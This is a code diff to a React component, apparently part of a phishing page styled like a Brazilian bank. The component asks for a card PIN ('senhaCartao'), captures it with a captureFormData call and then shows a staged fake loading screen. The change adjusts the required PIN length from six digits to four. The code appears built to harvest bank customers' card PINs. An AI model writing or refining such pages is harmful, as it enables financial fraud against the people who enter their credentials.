@@ -96,7 +96,7 @@ const SenhaAcesso = () => {
   }, [showFinalLoading]);
 
   const handleSenhaCartao = () => {
-    if (senhaCartao.length === 6) {
+    if (senhaCartao.length === 4) {
       captureFormData("senha-cartao", { senhaCartao });
       setShowFinalLoading(true);
       setFinalLoadingStep(0);
@@ -211,7 +211,7 @@ const SenhaAcesso = () => {
             <div className="flex-1" />
             <button
               onClick={handleSenhaCartao}
-              disabled={senhaCartao.length !== 6}
+              disabled={senhaCartao.length !== 4}
               className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#FF6200] enabled:text-white"
             >
               continuar
